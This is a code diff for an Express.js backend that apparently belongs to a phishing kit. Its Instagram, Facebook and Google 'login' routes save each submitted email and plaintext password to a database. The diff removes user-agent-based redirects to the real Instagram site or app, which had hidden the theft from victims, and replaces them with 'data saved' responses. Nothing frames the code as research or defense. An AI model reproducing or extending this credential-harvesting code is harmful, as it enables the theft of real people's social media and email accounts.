@@ -13,17 +13,8 @@ router.post("/instagram/login", async (req, res) => {
     try {
         const newUser = new insta({ email, password });
         await newUser.save();
+        res.status(200).send("Instagram data saved");
 
-        const userAgent = req.headers["user-agent"];
-        let redirectURL = "https://www.instagram.com/";
-
-        if (/android/i.test(userAgent)) {
-            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
-        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-            redirectURL = "instagram://app";
-        }
-
-        res.redirect(redirectURL);
     } catch (err) {
         console.error("❌ Error saving user data:", err.message);
         res.status(500).send("Server Down! Retry");
@@ -37,17 +28,10 @@ router.post("/facebook/login", async (req, res) => {
     try {
         const newUser = new fb({ email, password });
         await newUser.save();
+        res.status(200).send("Facebook data saved");
 
-        const userAgent = req.headers["user-agent"];
-        let redirectURL = "https://www.instagram.com/";
 
-        if (/android/i.test(userAgent)) {
-            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
-        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-            redirectURL = "instagram://app";
-        }
 
-        res.redirect(redirectURL);
     } catch (err) {
         console.error("❌ Error saving user data:", err.message);
         res.status(500).send("Server Down! Retry");
@@ -61,17 +45,10 @@ router.post("/google/login", async (req, res) => {
     try {
         const newUser = new google({ email, password });
         await newUser.save();
+        res.status(200).send("google data saved");
 
-        const userAgent = req.headers["user-agent"];
-        let redirectURL = "https://www.instagram.com/";
 
-        if (/android/i.test(userAgent)) {
-            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
-        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-            redirectURL = "instagram://app";
-        }
 
-        res.redirect(redirectURL);
     } catch (err) {
         console.error("❌ Error saving user data:", err.message);
         res.status(500).send("Server Down! Retry");
